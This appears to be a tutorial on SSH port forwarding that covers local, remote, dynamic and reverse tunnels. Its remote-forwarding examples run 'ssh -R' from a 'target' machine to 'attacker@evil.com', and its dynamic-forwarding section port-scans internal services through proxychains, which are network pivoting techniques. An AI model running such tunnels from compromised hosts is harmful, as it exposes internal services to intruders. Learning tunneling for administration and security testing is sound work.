### Port Forwarding with SSH

_Last modified: 2024-07-04_

SSH tunneling, also known as port forwarding, is a method of creating a tunnel between two endpoints through which traffic is forwarded.

#### Local Port Forwarding

We can forward a port on the local machine to a port on the remote machine by adding the flag `-L` with SSH. The remote SSH username/password is also required.

```bash
ssh -L [<local-ip>:]<local-port>:<destination-ip>:<destination-port> remote-user@<remote-ip>
```

Flags:
- `-f`: Background
- `-N`: Do not execute remote commands

```bash
ssh -L [<local-ip>:]<local-port>:<destination-ip>:<destination-port> remote-user@<remote-ip> -fN
```

#### Examples

Below are some examples:

- We can access the internal webserver in the remote machine via `http://127.0.0.1/`
  ```bash
  sudo ssh -L 80:127.0.0.1:80 john@example.com
  sudo ssh -L localhost:80:127.0.0.1:80 john@example.com
  ```

- We can connect to the database on local port 3306
  ```bash
  ssh -L 3306:db.example.com:3306 john@example.com
  ssh -L localhost:3306:db.example.com:3306 john@example.com
  # Another port
  ssh -L 3336:db.example.com:3306 john@example.com
  ```

- Multiple ports
  ```bash
  ssh -L 8001:127.0.0.1:8001 -L 9090:127.0.0.1:9090 john@example.com
  ```

#### Stop Local Port Forwarding

To stop the local port forwarding if it is running in the background, find the process ID and specify it to the kill command.

```bash
ps aux | grep ssh
kill <PID>
```

#### Remote Port Forwarding (Reverse Port Forwarding)

We can forward a port on the remote machine to a port on the local machine by adding the flag `-R` with SSH.

```bash
ssh -R [<remote-ip>:]<remote-port>:<destination-ip>:<destination-port> remote-user@<remote-ip>
```

#### Examples

Run the following command on the remote (target) machine:

- Example 1
  ```bash
  ssh -R 8080:127.0.0.1:3000 attacker@evil.com
  # Now access 127.0.0.1:3000 on the local machine. That means we can access 127.0.0.1:8080 of the remote machine.
  ```

- Example 2
  ```bash
  ssh -R 192.168.27.30:5555:127.0.0.1:4444 attacker@evil.com
  # Now access 127.0.0.1:4444 on the local machine. That means we can access the remote's internal service (192.168.27.30:5555).
  ```

#### Dynamic Port Forwarding

If we cannot determine the remote ports opened internally, we can find them using dynamic port forwarding. First, execute the dynamic port forwarding using SSH.

```bash
ssh -D 1337 remote-user@<remote-ip>
```

Then, update the configuration for Proxychains. In `/etc/proxychains.conf`, comment out `socks4 127.0.0.1 9050` and add `socks5 127.0.0.1 1337` at the bottom of the file.

```bash
# socks4 127.0.0.1 9050
socks5 127.0.0.1 1337
```

After that, try port scanning to find open ports on the remote machine over `127.0.0.1`.

```bash
proxychains nmap 127.0.0.1
```

When we find the open ports, we can execute the Local Port Forwarding using the ports we found. We can close the previous dynamic port forwarding if not necessary.

```bash
ssh -L <local-port>:127.0.0.1:<port-we-found> remote-user@<remote-ip>
```

For example, if we want to open port 80 locally, we need to run with root privileges.

```bash
sudo ssh -L 80:127.0.0.1:80 john@example.com
ssh -L 3306:127.0.0.1:3306 john@example.com
```

Now access `http://127.0.0.1/`. We can access the remote webserver.

#### Reverse Connection

Reverse connections are often used in situations where the server needs to be accessible from the client's network, but the server's network is restricted. By initiating a reverse connection, the client can establish a connection to the server without the need for the server to be accessible on the public internet.

1. **Generate SSH Keys on the Remote Machine:**
   ```bash
   ssh-keygen
   ```
   Then save them (public key and private key) to an arbitrary folder.
   ```bash
   mkdir /home/remote-user/reverse-keys
   mv id_rsa /home/remote-user/reverse-keys
   mv id_rsa.pub /home/remote-user/reverse-keys
   ```
   Copy the content of the public key (`id_rsa.pub`).

2. **Add the Content of the Public Key to `authorized_keys` on Your Local Machine:**
   ```bash
   echo 'content of public key' >> ~/.ssh/authorized_keys
   ```
   To clarify that the key is only for reverse connection, add the following line to this content in `authorized_keys`.
   ```bash
   # ~/.ssh/authorized_keys
   command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty id-rsa AAAAAB3NzaC........
   ```
   Check if the SSH server is running. If not, start the SSH server.
   ```bash
   sudo systemctl status ssh
   sudo systemctl start ssh
   ```

3. **Run Reverse Proxy on the Remote Machine:**

   Reverse port forwarding using the private key (`id_rsa`):
   ```bash
   ssh -R <local-port>:<remote-ip>:<remote-port> local-user@<local-ip> -i id_rsa -fN
   ```

4. **Confirmation on Your Local Machine:**

   You can access `<remote-ip>:<remote-port>`.

5. **Close Connection on Remote Machine:**

   After that, stop the reverse connection.
   ```bash
   ps aux | grep ssh
   sudo kill <PID>
   ```

#### References

- [How to Setup SSH Tunneling](https://linuxize.com/post/how-to-setup-ssh-tunneling/)

---

Hope this guide helps! If you need further assistance or have more examples, feel free to ask. 🚀
